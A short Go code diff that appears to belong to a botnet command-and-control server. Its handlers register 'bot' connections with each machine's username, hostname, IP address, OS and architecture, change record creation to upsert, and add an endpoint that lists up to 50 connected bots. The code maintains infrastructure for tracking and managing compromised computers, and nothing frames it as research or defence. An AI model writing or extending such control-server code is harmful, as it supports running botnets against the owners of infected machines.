@@ -26,7 +26,7 @@ func RConnect(ctx echo.Context) error {
 	dev_info := new(types.DeviceInfoStruct)
 	ctx.Bind(dev_info)
 	fmt.Printf("New bot connection: '%s@%s' (%s) %s, %s\n", dev_info.UserName, dev_info.HostName, ctx.RealIP(), dev_info.OSName, dev_info.Arch)
-	DB.Create(&Client{ID: dev_info.MachineID, Connected: true, DeviceInfoStruct: *dev_info})
+	DB.Save(&Client{ID: dev_info.MachineID, Connected: true, DeviceInfoStruct: *dev_info})
 	return ctx.JSON(http.StatusOK, types.ConnectResp{SessionID: dev_info.MachineID, Connected: true})
 }
 
@@ -43,4 +43,10 @@ func RDisconnect(ctx echo.Context) error {
 	bot.Connected = false
 	DB.Save(bot)
 	return nil
+}
+
+func RGetBots(ctx echo.Context) error {
+	var bots []Client
+	DB.Model(&Client{}).Limit(50).Find(&bots, &Client{Connected: true})
+	return ctx.JSON(http.StatusOK, bots)
 }
